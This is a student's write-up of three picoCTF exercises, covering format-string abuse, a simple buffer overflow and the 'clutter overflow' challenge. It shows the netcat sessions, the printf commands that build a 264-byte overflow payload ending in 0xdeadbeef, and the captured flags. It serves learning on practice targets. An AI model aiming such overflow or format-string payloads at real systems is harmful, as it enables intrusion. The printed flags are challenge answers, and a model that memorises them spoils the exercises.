# 1. Format string 0
> Using knowledge of format strings to give the correct commands to netcat connection to get the flag.
## Solution:
- Through the description and hint provided, the correct command revolved around format specifiers.
- Used the webshell (terminal) given in the site and connected to the address given.
- The output started with an interface where we had to choose 1 correct option out of the three.
- Since, specifiers start with % sign, I tried the options with % first and got the flag upon the correct command.
- Also, the source code shows %s highlighted in the option strings, indicating that it is the right option.
```
vshhh-picoctf@webshell:~$ nc mimas.picoctf.net 51345
Welcome to our newly-opened burger place Pico 'n Patty! Can you help the picky customers find their favorite burger?
Here comes the first customer Patrick who wants a giant bite.
Please choose from the following burgers: Breakf@st_Burger, Gr%114d_Cheese, Bac0n_D3luxe
Enter your recommendation: Gr%114d_Cheese
Gr                                                                                                           4202954_Cheese
Good job! Patrick is happy! Now can you serve the second customer?
Sponge Bob wants something outrageous that would break the shop (better be served quick before the shop owner kicks you out!)
Please choose from the following burgers: Pe%to_Portobello, $outhwest_Burger, Cla%sic_Che%s%steak
Enter your recommendation: Cla%sic_Che%s%steak
ClaCla%sic_Che%s%steakic_Che(null)
picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_f89c1405}
```
## Flag:
```
picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_f89c1405}
```
## Concepts Learnt:
- Format specifiers of strings in c programming- %s
- %114d is a specifier for signed decimal with atleast 114 characters.
- %to prints argument in octal numbers.
## Notes: 
- I saw the % sign in pe%to option and thought that it might be the correct answer.
- But that printed the octal value Pe20021560_Portobello instead.
- This is where I learned that %to converts to octal numbers.
- Then I followed the %s pattern in cheesesteak option to get the flag.
## Resources:
- https://www.geeksforgeeks.org/c/format-specifiers-in-c/
***
# 2. Buffer overflow 0
> Overflow the correct buffer in nc saturn.picoctf.net 60353 using the program and source code available.
## Solution:
- Running the netcat, we see there is an input needed.
- Looking at the souce code, we can see that the flag can be triggered through segmentation fault due to sigsegv_handler function.
- Also the input buffer has maximum size of 16 bytes.
- Overflowing the input with more than 16 bytes, we can create a segmentation fault and get the flag.
```
vshhh-picoctf@webshell:~$ nc saturn.picoctf.net 60353
Input: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
picoCTF{ov3rfl0ws_ar3nt_that_bad_9f2364bc}
```
## Flag:
```
picoCTF{ov3rfl0ws_ar3nt_that_bad_9f2364bc}
```
## Concepts Learnt:
- The sigsegv_handler function is a signal handler designed to handle segmentation fault signals. It prints the value of the global variable flag to standard output, flushes the output buffer, and then terminates the program with an exit code of 1.
- Buffer overflow occurs when software writing data to a buffer overflows the bufferâ€™s capacity, resulting in adjacent memory locations being overwritten.
## Notes:
- I tried entering different characters instead of one, but that exited the program. This is because mixed values can cause less predictable behaviour.
- Also, the characters entered should be more than 16 but not few more than it, due to few more bytes of compiler padding and more for saved addresses and pointers.
- So, spammed As atleast 28 times might work.
## Resources:
- https://www.cloudflare.com/learning/security/threats/buffer-overflow/
***
# 3. Clutter overflow
> Find out what will trigger the code to give the flag.
## Solution:
- Seeing chall.c file with gets() along with challenge name, we can see that we have to overflow the clutter with right amount of characters to get the flag.
- Size given is 0x100 which in decimal is 256 and 8 bytes of little-endian value 0xdeadbeef  which is required to get the flag and additional 8 byte padding to overwrite the long variable. This gives total 264 bytes or characters to overflow.
- Printing first cammand- 'A%.0s' {1..264} > payload.bin which prints only A character 264 times (not the arguments) and added in a payload.bin file
- Next- append the hex value of 0xdeadbeef (8 bytes) to payload.bin
- Then append '\n' (new line) to end the script.
- Cat the bin file and redirect the output to netcat connection. This gave the flag.
```
vaish@DESKTOP-59LUGSG:/mnt/c/Users/Vaishnavi/Downloads$ printf 'A%.0s' {1..264} > payload.bin
vaish@DESKTOP-59LUGSG:/mnt/c/Users/Vaishnavi/Downloads$ printf '\xef\xbe\xad\xde\x00\x00\x00\x00' >> payload.bin
vaish@DESKTOP-59LUGSG:/mnt/c/Users/Vaishnavi/Downloads$ printf '\n' >> payload.bin
vaish@DESKTOP-59LUGSG:/mnt/c/Users/Vaishnavi/Downloads$ cat payload.bin | nc mars.picoctf.net 31890
 ______________________________________________________________________
|^ ^ ^ ^ ^ ^ |L L L L|^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^|
| ^ ^ ^ ^ ^ ^| L L L | ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ |
|^ ^ ^ ^ ^ ^ |L L L L|^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ==================^ ^ ^|
| ^ ^ ^ ^ ^ ^| L L L | ^ ^ ^ ^ ^ ^ ___ ^ ^ ^ ^ /                  \^ ^ |
|^ ^_^ ^ ^ ^ =========^ ^ ^ ^ _ ^ /   \ ^ _ ^ / |                | \^ ^|
| ^/_\^ ^ ^ /_________\^ ^ ^ /_\ | //  | /_\ ^| |   ____  ____   | | ^ |
|^ =|= ^ =================^ ^=|=^|     |^=|=^ | |  {____}{____}  | |^ ^|
| ^ ^ ^ ^ |  =========  |^ ^ ^ ^ ^\___/^ ^ ^ ^| |__%%%%%%%%%%%%__| | ^ |
|^ ^ ^ ^ ^| /     (   \ | ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ |/  %%%%%%%%%%%%%%  \|^ ^|
.-----. ^ ||     )     ||^ ^.-------.-------.^|  %%%%%%%%%%%%%%%%  | ^ |
|     |^ ^|| o  ) (  o || ^ |       |       | | /||||||||||||||||\ |^ ^|
| ___ | ^ || |  ( )) | ||^ ^| ______|_______|^| |||||||||||||||lc| | ^ |
|'.____'_^||/!\@@@@@/!\|| _'______________.'|==                    =====
|\|______|===============|________________|/|""""""""""""""""""""""""""
" ||""""||"""""""""""""""||""""""""""""""||"""""""""""""""""""""""""""""
""''""""''"""""""""""""""''""""""""""""""''""""""""""""""""""""""""""""""
""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""
"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""
My room is so cluttered...
What do you see?
code == 0xdeadbeef: how did that happen??
take a flag for your troubles
picoCTF{c0ntr0ll3d_clutt3r_1n_my_buff3r}
```
## Flag:
```
picoCTF{c0ntr0ll3d_clutt3r_1n_my_buff3r}
```
## Concepts Learnt:
- gets() is not secure enough therefore can take overflow of characters.
- %.0s is a specifier that only prints the string and not any other argument.
- A payload file can be created to solve such challenges where the script overflows the netcat and gives the flag.
## Notes:
- At first I thought of adding only 256 bytes and 8 for padding.
- Upon inspecting the code even further I realised that the code also has to match 0xdeadbeef. So added its hex form.
## Resources:
- https://owasp.org/www-community/attacks/Buffer_overflow_attack
